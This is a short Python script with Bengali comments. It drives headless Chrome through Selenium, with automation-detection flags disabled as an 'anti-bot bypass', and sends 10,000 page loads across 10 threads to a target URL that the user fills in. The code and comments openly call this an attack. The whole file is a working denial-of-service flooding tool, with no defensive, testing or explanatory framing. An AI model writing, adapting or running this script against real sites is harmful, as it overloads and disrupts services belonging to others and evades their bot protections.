from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import threading
import time

# ✅ Chrome ব্রাউজার সেটআপ (Anti-Bot Bypass)
chrome_options = Options()
chrome_options.add_argument("--headless")  # ব্যাকগ্রাউন্ড মোড
chrome_options.add_argument("--disable-blink-features=AutomationControlled")
chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
chrome_options.add_experimental_option("useAutomationExtension", False)

# ✅ অ্যাটাক ফাংশন
def attack(url, total_requests):
    service = Service("/data/data/com.termux/files/usr/bin/chromedriver")  # Termux এর জন্য পাথ
    driver = webdriver.Chrome(service=service, options=chrome_options)

    for _ in range(total_requests):
        try:
            driver.get(url)
            print(f"🔥 {url} এ অ্যাটাক পাঠানো হয়েছে")
            time.sleep(0.5)
        except Exception as e:
            print(f"❌ ব্যর্থ: {e}")
    
    driver.quit()  # থ্রেড শেষ হলে ড্রাইভার বন্ধ করা

# ✅ মাল্টি-থ্রেডেড অ্যাটাক ফাংশন
def start_attack(url, total_requests, threads):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(url, total_requests // threads))
        thread_list.append(thread)
        thread.start()
    
    for thread in thread_list:
        thread.join()

# ✅ অ্যাটাক চালানো
if __name__ == "__main__":
    target_url = "https://target-website.com"  # আপনার টার্গেট URL এখানে দিন
    total_requests = 10000  # মোট রিকোয়েস্ট সংখ্যা
    threads = 10  # থ্রেডের সংখ্যা (পারালাল অ্যাটাক)
    
    start_attack(target_url, total_requests, threads)
